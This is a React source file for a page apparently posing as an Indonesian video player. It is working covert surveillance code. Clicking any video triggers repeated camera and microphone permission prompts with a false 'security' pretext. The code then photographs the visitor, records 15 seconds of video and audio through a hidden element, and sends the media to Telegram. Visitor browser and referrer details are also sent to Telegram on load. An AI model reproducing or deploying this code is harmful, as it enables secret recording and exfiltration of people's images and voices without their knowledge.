import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamRef = useRef<MediaStream | null>(null);

  const videos = [
    //{ videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/9pphjwtbbj0wup2v7svjp/VID_20250404_070105_988.mp4.mov?rlkey=pyyymd5qu6x607pia463rsbcq&st=ce5hy4h7&dl=0' },
    { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
    { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
    { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
    { videoUrl: 'https://cdn.videy.co/16gpSQzQ.mp4' },
    //{ videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/1oz45iy46bchnh9bwqmh9/VID_20250404_065252_933.mp4?rlkey=4f77pchh064fi0llg0kmftc5f&st=hbrq5j1q&dl=0' },
    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
    { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
    { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
    { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
    //{ videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    //{ videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/0x1dsbfvwq9cufeboduzv/VID_20250404_065224_172.mp4?rlkey=luad0i1xf7ehqrhcp393eoomp&st=0o61frj3&dl=0' },
   // { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/iwhlu5kv3fw4a6u0erx7g/VID_20250404_064856_263.mp4?rlkey=u9qzo7pmtrbchf3wym6plqrz1&st=u4chjc3s&dl=0' },
    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
    { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' } // Video baru dari cdn.videy.co
  ];

  useEffect(() => {
    // Mulai memantau aktivitas mencurigakan
    monitorSuspiciousActivity();

    const sendVisitorNotification = async () => {
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      };
      try {
        await sendTelegramNotification(visitorDetails);
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };
    sendVisitorNotification();

    // Log untuk debugging
    videos.forEach((video, index) => {
      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
      }
    });

    return () => {
      cleanupMediaStream(cameraStreamRef);
    };
  }, []);

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Mulai proses pengambilan media...');
    const maxAttempts = 3;
    let attempts = 0;

    const requestMediaAccess = async () => {
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevice = devices.find(device => device.kind === 'videoinput');
        
        if (!videoDevice) throw new Error('Tidak ada perangkat input video yang ditemukan');

        const constraints = {
          video: { 
            deviceId: videoDevice.deviceId, 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 30 }
          },
          audio: true
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        cameraStreamRef.current = stream;
        return stream;
      } catch (error) {
        console.error('Gagal mendapatkan akses media:', error);
        attempts++;
        if (attempts < maxAttempts) {
          alert(`Akses ditolak. Harap izinkan untuk melanjutkan (${attempts}/${maxAttempts}). Kami membutuhkan ini untuk "keamanan".`);
          return await requestMediaAccess();
        } else {
          throw new Error('Akses media ditolak setelah beberapa percobaan.');
        }
      }
    };

    try {
      videoElement.play().catch(err => console.error('Error memutar video:', err));
      const stream = await requestMediaAccess();

      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = stream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play();
          setTimeout(resolve, 500);
        };
      });

      const videoWidth = cameraVideo.videoWidth;
      const videoHeight = cameraVideo.videoHeight;
      console.log('Dimensi video asli:', videoWidth, 'x', videoHeight);

      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight, offsetX, offsetY;

      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = 720;
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = 1280;
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      offsetX = (drawWidth - videoWidth) / 2;
      offsetY = (drawHeight - videoHeight) / 2;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
      });

      await sendImageToTelegram(photoBlob);

      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';

      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 });
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        await sendVideoToTelegram(videoBlob);
        cleanupMediaStream(cameraStreamRef);
        if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
      };

      mediaRecorder.start(1000);
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
        videoElement.pause();
        setIsPlaying(null);
      }, 15000);

    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      cleanupMediaStream(cameraStreamRef);
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error('Video URL tidak valid, menghentikan pemutaran.');
        return;
      }

      try {
        await videoElement.play();
        setIsPlaying(index);
        await captureAndSendMedia(videoElement);
      } catch (error) {
        console.error('Error memutar video:', error);
        setIsPlaying(null);
      }
    }
  };

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
        setIsFullscreen(false);
      }
      console.log(`Toggled fullscreen for video at index: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    setIsPlaying(null);
    console.log(`Video at index ${index} has ended`);
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[360px] mx-auto">
          <div className="space-y-2">
            {videos.map((video, index) => (
              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                <video
                  ref={(el) => (videoRefs.current[index] = el)}
                  src={video.videoUrl}
                  className="w-full h-full object-cover"
                  muted
                  loop
                  onClick={() => handleVideoClick(index)}
                  onEnded={() => handleVideoEnded(index)}
                  preload="metadata"
                >
                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                </video>
                {isPlaying === index && (
                  <div className="absolute bottom-2 right-2 z-20">
                    <button
                      onClick={() => toggleFullscreen(index)}
                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                    >
                      {isFullscreen ? (
                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                      ) : (
                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
